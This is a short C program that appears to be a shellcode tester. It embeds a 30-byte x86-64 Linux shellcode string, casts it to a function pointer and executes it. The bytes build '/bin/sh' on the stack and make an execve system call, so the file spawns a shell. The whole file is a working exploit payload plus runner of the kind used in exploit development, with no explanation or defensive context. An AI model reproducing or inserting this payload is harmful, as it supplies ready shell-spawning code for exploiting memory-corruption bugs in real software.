#include <stdio.h>
#include <string.h>

const char shellcode[] =
"\x48\xbf\x30\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57"
"\x48\x89\xe7\x57\x48\x31\xd2\x52\x48\x89\xe6\xb0\x3b\x0f\x05";

int main() {
    int (*funct)();
    funct = (int (*)()) shellcode;
    printf("Shellcode lenght=%d\n",(int)strlen(shellcode));
    (int)(*funct)();
    return 0;
}
